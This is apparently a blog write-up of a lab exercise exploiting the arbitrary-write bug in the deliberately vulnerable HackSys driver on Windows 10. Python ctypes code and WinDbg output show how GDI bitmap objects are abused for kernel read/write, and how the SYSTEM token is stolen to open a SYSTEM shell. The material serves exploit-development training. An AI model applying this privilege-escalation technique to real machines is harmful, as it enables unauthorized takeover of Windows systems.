---
layout:		post
title:		HackSysExtremeVulnerableDriver GDI Bitmap Abuse
author:		wooy0ung
tags:		hevd
category:	exploit
---

>[Analysis Environment]  
>guest machine: Windows 10 1511 Feb 2016  
>host machine: Windows 10  
>necessary tools: VirtualKD[[here]](http://virtualkd.sysprogs.org/)、OSRloader[[here]](https://www.osronline.com/article.cfm?article=157)、HackSysExtremeVulnerableDriver[[here]](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)、Windbg  
<!-- more -->


## 0x001 Test POC

Make sure our arbitrary write still works as expected on Win 10.
```
import sys
from ctypes import *

kernel32 = windll.kernel32
hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",0xc0000000,0,None,0x3,0,None)

if not hevDevice or hevDevice == -1:
	print "[-] Couldn't get Device Driver handle."
	sys.exit(0)
buf = "A"*8 + "B"*8
buflen = len(buf)

kernel32.DeviceIoControl(hevDevice,0x22200B,buf,buflen,None,0,byref(c_ulong()),None)
```

Well, I got the feedback, it work fine!
```
****** HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE ******
[+] UserWriteWhatWhere: 0x0000000002090E18
[+] WRITE_WHAT_WHERE Size: 0x10
[+] UserWriteWhatWhere->What: 0x4141414141414141
[+] UserWriteWhatWhere->Where: 0x4242424242424242
[+] Triggering Arbitrary Overwrite
[-] Exception Code: 0xC0000005
****** HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE ******
```


## 0x002 How to Exploit it?

Take it easy~ 

Now, I will create a Bitmap objects, and try to find where it is.
```
HBITMAP CreateBitmap（
 _In_ int nWidth，
 _In_ int nHeight，
 _In_ UINT cPlanes，
 _In_ UINT cBitsPerPel，
 _In_ const VOID * lpvBits
);
```

Execute this script, the process will be hung up.
```
import sys,time
from ctypes import *

kernel32 = windll.kernel32
gdi32 = windll.gdi32
hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",0xc0000000,0,None,0x3,0,None)

if not hevDevice or hevDevice == -1:
	print "[-] Couldn't get Device Driver handle."
	sys.exit(0)
	
bmp = gdi32.CreateBitmap(0x64,0x64,1,32)
print "[+] Bitmap objects Addr: {0}".format(hex(bmp))

kernel32.DebugBreak()
kernel32.DebugBreak()

while True:
    time.sleep(60*60*24)
```

The handle is printed.
```
C:\Users\wooy0ung>python C:\Users\wooy0ung\Desktop\poc.py
[+] Bitmap objects Addr: 0x20050b46
```

Try to find out the "GdiSharedHandleTable" step by step.
```
kd> !process 0 0 python.exe
PROCESS ffffe00058481840
    SessionId: 1  Cid: 0584    Peb: 002ad000  ParentCid: 02f8
    DirBase: 42277000  ObjectTable: ffffc000e4cf6ac0  HandleCount: <Data Not Accessible>
    Image: python.exe

kd> .process ffffe00058481840
Implicit process is now ffffe000`58481840
WARNING: .cache forcedecodeuser is not enabled
kd> .context
User-mode page directory base is 42277000
kd> r $peb
$peb=00000000002ad000
kd> dt nt!_PEB 00000000002ad000 GdiSharedHandleTable
   +0x0f8 GdiSharedHandleTable : 0x00000000`00b90000 Void
```

GdiSharedHandleTable is a pointer array, we access the array by last two bytes of bitmap handles in order[GdiSharedHandleTable + (handle & 0xffff) * (x64:0x18,x86:0x10]
```
kd> dt nt!_PEB 00000000002ad000 GdiSharedHandleTable
   +0x0f8 GdiSharedHandleTable : 0x00000000`00b90000 Void
kd> dq 0x00000000`00b90000 + (0x6105104c & 0xffff)*0x18 L3
00000000`00ba8720  fffff901`44895000 40056105`00000584
00000000`00ba8730  00000000`00000000
```
Addr of the Bitmap which I create just now may be 0xfffff90144895000 while the PID is 1412(0x584)

We can verify the Addr by ProcessHacker.
![](/assets/img/exploit/2018-08-07-hacksys-extreme-vulnerable-driver-gdibitmapabuse/0x001.png)

When we create a Bitmap object, SURFACE OBJECT will be created, including BASEOBJECT、SURFOBJECT and pvScan0 which belongs to the SURFOBJECT pointing to the Pixel Data.
![](/assets/img/exploit/2018-08-07-hacksys-extreme-vulnerable-driver-gdibitmapabuse/0x002.png)
```
typedef struct {
 BASEOBJECT64   BaseObject;
 SURFOBJ64      SurfObj; 
 .......
} SURFACE64

typedef struct {
 ULONG64    hHmgr;
 ULONG32    ulShareCount;
 WORD       cExclusiveLock;
 WORD       BaseFlags;
 ULONG64    Tid;
} BASEOBJECT64;

typedef struct {
 ULONG64    dhsurf;
 ULONG64    hsurf;
 ULONG64    dhpdev;
 ULONG64    hdev;
 SIZEL      sizlBitmap;
 ULONG64    cjBits;
 ULONG64    pvBits;
 ULONG64    pvScan0;
 ULONG32    lDelta;
 ULONG32    iUniq;
 ULONG32    iBitmapFormat;
 USHORT     iType;
 USHORT     fjBitmap;
} SURFOBJ64
```

Declare two Bitmap objects(hManager, hWorker). Set hManager's pvScan0 to the Addr of hWorker's pvScan0. Well, we may use the ArbitratyOverite vulnerability.
![](/assets/img/exploit/2018-08-07-hacksys-extreme-vulnerable-driver-gdibitmapabuse/0x003.png)

But first, we should get GdiSharedHandleTable Addr
```
pbi = PROCESS_BASIC_INFORMATION()
ntdll.NtQueryInformationProcess.argtypes = (HANDLE, UINT, c_void_p, ULONG, POINTER(ULONG))
ntdll.NtQueryInformationProcess(kernel32.GetCurrentProcess(), 0, byref(pbi), sizeof(pbi), None)
peb = pbi.PebBaseAddress.contents
gdiHandleTable = peb.GdiSharedHandleTable
print "[+] GdiSharedHandleTable : {0}".format(hex(gdiHandleTable))
```

Then I will calculate pvscan0 offset of every Bitmap objects of which I created.
```
ptr = gdiHandleTable + (hManager & 0xFFFF) * sizeof(GDICELL64())
gdicell64 = cast(ptr, POINTER(GDICELL64))
hManager_pvscan0_off = gdicell64.contents.pKernelAddress + 0x50
print "[+] hManager_pvscan0_off : {0}".format(hex(hManager_pvscan0_off))

ptr = gdiHandleTable + (hWorker & 0xFFFF) * sizeof(GDICELL64())
gdicell64 = cast(ptr, POINTER(GDICELL64))
hWorker_pvscan0_off = gdicell64.contents.pKernelAddress + 0x50
print "[+] hWorker_pvscan0_off  : {0}".format(hex(hWorker_pvscan0_off))
```

Using our arbitrary write we want to set the pvScan0 address for the "manager" bitmap to point at the pvScan0 address of the "worker" bitmap.
```
write_where = hManager_pvscan0_off
write_what_ptr = c_void_p(hWorker_pvscan0_off)
buf = struct.pack("<Q", write_what_ptr) + struct.pack("<Q", write_where)
buf_ptr = id(buf) + 0x20
buflen = len(buf)
kernel32.DeviceIoControl(hevDevice, 0x22200B, buf_ptr, buflen, None, 0,byref(c_ulong()), None)
```

Check if this is valid.
![](/assets/img/exploit/2018-08-07-hacksys-extreme-vulnerable-driver-gdibitmapabuse/0x004.png)
Success. Now, I may read and write a specific memory with GetBitmapBits and SetBitmapBits method.

PsInitialSystemProcess is a global variable containing the EPROCESS structure address of the SYSTEM process. Therefore, we can get the EPROCESS of the SYSTEM process by looking up the address in the kernel land.
![](/assets/img/exploit/2018-08-07-hacksys-extreme-vulnerable-driver-gdibitmapabuse/0x005.png)

And now, I should calculate the offset of some import property. There is a good news that we find out the SYSTEM EPROCESS Addr(0xffffe0008425d040 at this time). Let's set a breakpoint~
```
kd> dt _EPROCESS UniqueProcessId ActiveProcessLinks
ntdll!_EPROCESS
   +0x2e8 UniqueProcessId    : Ptr64 Void
   +0x2f0 ActiveProcessLinks : _LIST_ENTRY
kd> dt _EPROCESS ImageFileName Token
ntdll!_EPROCESS
   +0x358 Token         : _EX_FAST_REF
   +0x450 ImageFileName : [15] UChar
```

Clearly, I get the offset!
```
token_off = 0x358
unique_process_id_off = 0x2e8
active_process_links_off = 0x2f0
```

Next step, find CURRENT EPROCESS structure, then, copy system token to the current process.

finally, pop a system cmd.
```
...
system_token = c_ulonglong()
read_mem(SYSTEM_EPROCESS + token_off, byref(system_token), sizeof(system_token));
write_mem(CURRENT_EPROCESS + token_off, byref(system_token), sizeof(system_token));

Popen("start cmd", shell=True)
```

pwn~
![](/assets/img/exploit/2018-08-07-hacksys-extreme-vulnerable-driver-gdibitmapabuse/0x006.png)


## 0x003 Reference

[Part 17: Kernel Exploitation -> GDI Bitmap Abuse (Win7-10 32/64bit)](http://www.fuzzysecurity.com/tutorials/expDev/21.html)
[Window Kernel Exploit -> GDI Bitmap Abuse](http://gflow.co.kr/window-kernel-exploit-gdi-bitmap-abuse/)
[Techwiki:Win32k/BASEOBJECT](https://www.reactos.org/wiki/Techwiki:Win32k/BASEOBJECT)